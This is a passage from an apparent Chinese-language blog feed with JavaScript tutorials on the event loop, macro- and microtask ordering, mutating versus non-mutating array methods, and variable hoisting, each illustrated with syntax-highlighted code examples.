function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">delay2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 2.5.'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 3.'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message 0.'</span><span class="token punctuation">)</span><span class="token function">fn3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Message 0.</span><span class="token comment">// Message 1.</span><span class="token comment">// Message 3.</span><span class="token comment">// Message 2.</span><span class="token comment">// Message 2.5. (大约 1 秒后)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>动画演示：</p><p><img src="https://i.loli.net/2019/06/19/5d0a53f02b34680755.gif" alt="stack_fn_queue.gif"></p><p>这里的结果就明显与之前的例子不同了，根据上面的描述，顺序为：</p><ul><li>输出 <code>Message 0.</code>；</li><li><code>fn3()</code> 压入栈底；</li><li>然后压入 <code>fn2()</code>；</li><li>最后压入 <code>fn1()</code>；</li><li><code>fn1()</code> 内的语句执行完后，输出 <code>Message 1.</code>；</li><li>执行函数 <code>fn2()</code> 的语句；</li><li>由于 <code>fn2()</code> 内的 <code>setTimeout()</code> 函数是一个延时函数，所以其调用函数 <code>delay1()</code> 就被放到了消息队列中；</li><li>然后执行 <code>fn3()</code> 中的 <code>setTiemout()</code>，其调用函数 <code>delay2()</code> 也被放入了队列中；</li><li>由于 <code>delay1()</code> 的延时小于 <code>delay2()</code>，所以 <code>delay2()</code> 被放到了 <code>delay()</code> 的后面，反之颠倒顺序；</li><li>输出 <code>fn3()</code> 中的 <code>Message 3.</code>；</li><li>此时开始执行消息队列的函数；</li><li>先执行 <code>delay1()</code> 输出 <code>Message 2.</code>；</li><li>然后执行 <code>delay2()</code> 输出 <code>Message 2.5</code>；</li></ul><p><strong>注意</strong>，即使 <code>delay1()</code> 的延时为 <code>0</code>，也并不意味着该回调函数会在 0 毫秒后执行，即不会立即执行，由于机制原因，同样会被放入消息队列中，只不过会 <strong>比较早执行</strong> 而已；</p><h1 id="事件循环-Event-Loop"><a href="#事件循环-Event-Loop" class="headerlink" title="事件循环 (Event Loop)"></a>事件循环 (Event Loop)</h1><p>所谓事件循环，大致就是上诉过程；这里的 <strong>事件</strong> 指的就是消息队列中的消息，即队列中的调用函数；<strong>循环</strong> 即不断执行完队列中的消息，并等待是否有新消息到达，进而将其执行的这一循环过程；</p><h1 id="宏任务-微任务"><a href="#宏任务-微任务" class="headerlink" title="宏任务/微任务"></a>宏任务/微任务</h1><p>由于 JavaScript 的执行是<strong>单线程</strong>的（浏览器是多线程的），所以为了避免代码执行时遇到一些耗时的操作阻塞后续操作，就有了<strong>同步任务</strong>和<strong>异步任务</strong>之分；在 js 执行期间，遇到同步任务就执行<strong>入栈</strong>操作，遇到异步任务就放入<strong>队列</strong>中，栈中的同步任务执行完后再执行队列中的异步任务，也就是上面说的事件循环，这样就避免了耗时任务对栈中主线程的阻塞，一般大多数函数和变量声明都是同步任务，异步任务占少数如 <code>setTimeout()</code>, <code>setInterval()</code>, <code>Promise()</code> 等；其中，异步任务又可分为<strong>宏任务</strong>和<strong>微任务</strong>；</p><p>宏任务常见的有 <code>setTimeout()</code>, <code>setInterval()</code>，微任务常见的便是 <code>Promise()</code> 和 <code>process.nextTick()</code>（nodejs 中使用）；之前只提到消息队列，这里为了便于理解可以把宏任务和微任务看成两个分开的队列：宏任务队列与微任务队列；</p><p>我们通过以下代码看一下同步任务、宏任务、微任务的执行顺序：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Sync task.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Macro task.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Micro task.'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'End.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Sync task.</span><span class="token comment">// End.</span><span class="token comment">// Micro task.</span><span class="token comment">// Macro task.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来我们把宏任务和微任务的顺序换一下，再看一下结果：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Sync task.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Micro task.'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Macro task.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'End.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Sync task.</span><span class="token comment">// End.</span><span class="token comment">// Micro task.</span><span class="token comment">// Macro task.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>综合结果证明，任务的执行顺序是：</p><pre class="line-numbers language-none"><code class="language-none">同步任务 --&gt; 微任务 --&gt; 宏任务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再考虑下面这个较有代表性的稍微复杂点的嵌套情况（答案在代码最右侧，先思考再检查）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                                                                                                                                 <span class="token comment">// 0  </span>                                                                                                                                   <span class="token comment">// 3  </span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                                                                                                                 <span class="token comment">// 9  </span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                <span class="token comment">// 5  </span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>                                                                                                                            <span class="token comment">// 2  </span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                                                                                                                 <span class="token comment">// 8  </span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                <span class="token comment">// 6  </span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>                                                                                                                              <span class="token comment">// 7  </span>                                                                                                                                   <span class="token comment">// 4  </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                    <span class="token comment">// 1  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看答案后看看结果和预想的是否一致；可能唯一有疑惑的地方就是 <strong>3</strong> 和 <strong>9</strong> 的输出顺序，因为前面不是讲同步任务会先于 Promise 微任务执行吗？应该是 <strong>9</strong> 在 <strong>3</strong> 前面才对呀？其实不然，并不是在 Promise 函数代码内的都是微任务，因为所谓 <strong>微任务</strong> 就是一项任务，即指令下达后要做的事情，那么在函数中 <strong>要做的事</strong> 其实是 <code>.then()</code> 中包裹的代码，而 Promise 函数中包裹的代码（输出 <strong>3</strong>、<strong>4</strong>、<strong>5</strong>）算作 <strong>同步任务</strong> 的一部分，所以 <strong>3</strong> 会先于 <strong>9</strong> 输出；</p><p>另外，我们还能注意到，输出 <strong>6</strong> 的代码被 <code>setTimeout</code> 这个宏任务包裹，但这个宏任务又被 <code>.then()</code> 这个微任务包裹，根据最终的结果，这个宏任务基本还是被正常对待，只是在相同延时的宏任务中被最后执行了，尽管在代码中这个微任务中的宏任务写在了普通宏任务的前面，所以最终 <strong>8</strong> 会比 <strong>6</strong> 先输出；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> event-loop 事件循环 堆栈 宏任务 微任务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 变异与非变异数组方法</title>
      <link href="/2024/09/27/javascript/javascript-bian-yi-yu-fei-bian-yi-shu-zu-fang-fa/"/>
      <url>/2024/09/27/javascript/javascript-bian-yi-yu-fei-bian-yi-shu-zu-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>在 JavaScript 中，存在大量对数组进行操作的方法，它们都有一个特点，就是关于此操作是否会修改原数组，并以此将数组方法分为<strong>变异数组方法</strong>与<strong>非变异数组方法</strong>，例如 <code>.pop()</code> 方法便是删除数组的最后一个元素，而 <code>.slice()</code> 方法则是返回一个指定特征的新数组，并不会对原数组进行修改；能有效的区分这两类方法，有助于开发过程中方法选用，避免出现不必要的错误；</p><p>下面对一些常见的数组方法进行了整理分类：</p><table><thead><tr><th>非变异数组方法</th><th>变异数组方法</th></tr></thead><tbody><tr><td>.join()</td><td>.push()</td></tr><tr><td>.concat()</td><td>.pop()</td></tr><tr><td>.slice()</td><td>.shift()</td></tr><tr><td>.from()</td><td>.reverse()</td></tr><tr><td>.map()</td><td>.sort()</td></tr><tr><td>.filter()</td><td>.splice()</td></tr><tr><td>.every()</td><td>.fill()</td></tr><tr><td>.find()</td><td></td></tr><tr><td>.findIndex()</td><td></td></tr><tr><td>.flat()</td><td></td></tr><tr><td>.flatMap()</td><td></td></tr><tr><td>.forEach()</td><td></td></tr><tr><td>.includes()</td><td></td></tr><tr><td>.indexOf()</td><td></td></tr><tr><td>.lastIndexOf()</td><td></td></tr><tr><td>.reduce()</td><td></td></tr><tr><td>.reduceRight()</td><td></td></tr><tr><td>.some()</td><td></td></tr><tr><td>.toString()</td><td></td></tr><tr><td>.toLocalString()</td><td></td></tr></tbody></table><p>可以看出改变原数组的变异数组方法只有少数几个，非变异的过多可能记不住，因此可以选择记少不记多的原则，记住那几个特殊的变异方法的，其余的便可归类于非变异的了；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 变异数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 变量提升（Hoisting）详解</title>
      <link href="/2024/09/27/javascript/javascript-bian-liang-ti-sheng-xiang-jie/"/>
      <url>/2024/09/27/javascript/javascript-bian-liang-ti-sheng-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>变量提升</strong>是 JavaScript 的一种执行机制，大致就是字面意思，将声明的变量提前，但并不是指在编译时改变语句的顺序，而是将变量<strong>提前</strong>放入内存中，供后续操作，下面通过实例进行分析；</p><h1 id="函数申明"><a href="#函数申明" class="headerlink" title="函数申明"></a>函数申明</h1><p>在 JavaScript 中，声明一个函数并执行的话，通常会是以下形式：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// run</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面是正常的思维顺序，但是包括其他一些编程语言在内，通常会使用如下形式：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// run</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样做在执行上是没用问题的，同时可以在包含大量语句和函数申明的情况下，也可以使用这种特性将普通语句和函数申明分开，提高可读性；</p><p>以上情况便是一种常见的**提升(Hoisting)**，即编译时提前将当前执行上下文包含的申明的函数，提前放入内存中，供全文语句执行时调用，为了方便理解而抽象成一种提升行为；</p><p>但是如果使用下面的方式申明函数并执行：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token function-variable function">fn</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// TypeError: fn is not a function</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就没有像上面一样的结果了，这属于下面将介绍的变量提升行为；</p><h1 id="变量申明"><a href="#变量申明" class="headerlink" title="变量申明"></a>变量申明</h1><p>当然函数只是一种类型的变量，还存在其他的变量类型，例如考虑以下语句：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>逻辑和执行都是正常的，输出结果也是预期的，但是如果变一下顺序：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种情况，通常可能会认为第一行调用了一个未定义的变量，然后输出 <code>Uncaught ReferenceError: a is not defined</code> 这样的错误，但是呢，并非如此，输出信息如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没错，就只有一个单独的 <code>undefined</code>，这种输出情况就类似于以下代码的执行：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>从这里便可以大致分析出，前面的顺序怪异的代码，相当于在编译时<strong>提前</strong>将后面出现的变量申明提前，然后执行就输出了一个已申明但未 <strong>初始化（赋值）</strong> 的值，这便是其他类型的变量的<strong>提升</strong>行为，即在当前执行上下文中，将后面申明的变量提前放入内存，供前面的语句调用；</p><p><strong>注意</strong>，前面的代码最后一行的语句是 <code>var a = 1</code>，即对变量进行了申明并赋值，但是最后输出仍然是 <code>undefined</code> 而不是 <code>1</code>，证明变量提升行为只会对变量进行申明操作，并不会对其初始化赋值，不管原语句是否有赋值操作；</p><p>然后便能解释之前的代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token function-variable function">fn</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// TypeError: fn is not a function</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种情况便是将变量 <code>fn</code> 提升，值为 <code>undefined</code>，所以执行 <code>fn()</code> 语句会提示 <code>fn is not a function</code> 而不是 <code>fn is not defined</code>，与使用关键字 <code>function</code> 申明函数情况不一样；</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><h2 id="return-的限制"><a href="#return-的限制" class="headerlink" title="return 的限制"></a>return 的限制</h2><p>另外值得一提的是，我们都知道 <code>return</code> 是函数内代码执行结束的标志，其后代码不会执行，但是提升行为却不受此限制，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fnn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">fnn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'exist.'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// undefined</span><span class="token comment">// exist.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="提升优先级"><a href="#提升优先级" class="headerlink" title="提升优先级"></a>提升优先级</h2><p>上面提到两种提升行为，那么它们的优先级顺序是如何的呢？还是通过代码说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// f a() &#123;&#125;</span><span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// f a() &#123;&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果证明函数的提升优先级始终高于普通变量的提升；</p><h2 id="提升的执行"><a href="#提升的执行" class="headerlink" title="提升的执行"></a>提升的执行</h2><p>再来看一种情况：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">fnn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">fnn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里按照正常的逻辑，申明函数 <code>fnn()</code> 之前就已经申明了变量 <code>a</code>，所以会感觉函数 fnn 应该可以访问变量 a，但是最后输出的并不是 <code>1</code>，输出 <code>undefined</code> 说明函数 fnn 并没有访问到赋值后的 a，并且所访问的 a 也触发了提升机制，因为输出的不是 <code>RefferenceError</code>，那么就能大致梳理出提升真<br>正的执行顺序了：</p><ol><li><p>执行 fn();</p></li><li><p>执行 fnn();</p><ol><li>发现前面没有关于函数 fnn() 的申明，于是向后寻找，最后找到了；</li><li>执行 console.log(a);</li><li>发现 fnn 内部没有 a 的定义，向外一层寻找；</li></ol></li><li><p>a 申明在 fnn() 执行语句以后，所以 a 触发提升，供之前的 console.log 使用；</p><p>因此上面的代码相当于是以下面的顺序执行的：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="var-let-const的区别"><a href="#var-let-const的区别" class="headerlink" title="var, let, const的区别"></a>var, let, const的区别</h1><p>JavaScript 中申明变量的方式以及对应效果如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>       <span class="token comment">// 全局变量</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment">// 局部作用域变量（当前上下文）</span><span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span class="token comment">// 块级作用域变量（当前块级上下文）</span><span class="token keyword">const</span> d <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">// 常量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>这里解释一下，变量 a 申明时没有带任何关键字，默认其为全局变量；变量 b 申明带有关键字 <code>var</code>，为当前上下文的局部作用域，如果用在全局则为全局变量；变量 c 使用关键字关键字 <code>let</code>，d 使用关键字 <code>const</code>，二者都是<strong>ES6</strong>中新增的<strong>块级</strong>作用域申明，只不过 <code>const</code> 申明的是常量，值不可更改；</p><p>通过例子看一下它们的区别；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> 